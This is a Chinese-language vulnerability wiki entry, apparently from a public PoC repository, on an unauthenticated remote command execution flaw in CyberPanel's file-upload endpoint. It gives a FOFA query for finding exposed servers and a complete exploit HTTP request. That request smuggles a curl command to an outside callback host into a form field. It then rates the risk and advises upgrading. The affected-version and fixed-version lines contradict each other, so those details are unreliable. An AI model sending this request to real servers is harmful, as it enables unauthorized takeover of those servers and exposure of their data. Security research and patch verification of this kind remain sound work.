---
fofa: "app="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# CyberPanel filemanagerupload 远程命令执行漏洞

# 漏洞描述

该漏洞源于filemanager/upload接口未做身份验证和参数过滤，未授权的攻击者可以通过此接口远程加载恶意文件获取服务器权限，从而造成数据泄露、服务器被接管等严重的后果。目前该漏洞技术细节与EXP已在互联网上公开，鉴于该漏洞影响范围较大，建议用户尽快做好自查及防护。

# 影响版本

CyberPanel >= v2.3.7

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="CyberPanel"

POC/EXP：

POST /filemanager/upload HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=----NewBoundary123456789

------NewBoundary123456789
Content-Disposition: form-data; name="domainName"

<target>
------NewBoundary123456789
Content-Disposition: form-data; name="completePath"

curl http://5zx162b1.eyes.sh
------NewBoundary123456789
Content-Disposition: form-data; name="file"; filename="poc.txt"

pwn
------NewBoundary123456789--

![image-20241101112321259](./.resource/CyberPanelfilemanagerupload远程命令执行漏洞/media/image-20241101112321259.png)


![image-20241101112349821](./.resource/CyberPanelfilemanagerupload远程命令执行漏洞/media/image-20241101112349821.png)


影响资产超15w,可直接命令执行，危害极大。

![image-20241101112513189](./.resource/CyberPanelfilemanagerupload远程命令执行漏洞/media/image-20241101112513189.png)


# 修复方案

目前官方已有可更新版本，建议受影响用户升级至最新版本：

CyberPanel >= v2.3.7

官方下载地址：

https://github.com/usmannasir/cyberpanel/tree/v2.3.7


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
